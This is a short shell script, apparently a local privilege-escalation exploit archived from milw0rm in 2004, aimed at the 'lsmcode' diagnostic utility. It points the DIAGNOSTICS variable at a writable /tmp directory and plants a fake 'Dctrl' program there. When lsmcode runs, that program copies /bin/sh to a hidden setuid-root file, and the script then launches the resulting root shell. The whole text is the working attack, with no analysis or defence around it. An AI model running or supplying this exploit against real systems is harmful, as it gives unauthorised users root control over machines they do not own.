mkdirhier /tmp/aap/bin
export DIAGNOSTICS=/tmp/aap
cat > /tmp/aap/bin/Dctrl << EOF
#!/bin/sh
cp /bin/sh /tmp/.shh
chown root:system /tmp/.shh
chmod u+s /tmp/.shh
EOF
chmod a+x /tmp/aap/bin/Dctrl
lsmcode
/tmp/.shh

# milw0rm.com [2004-12-21]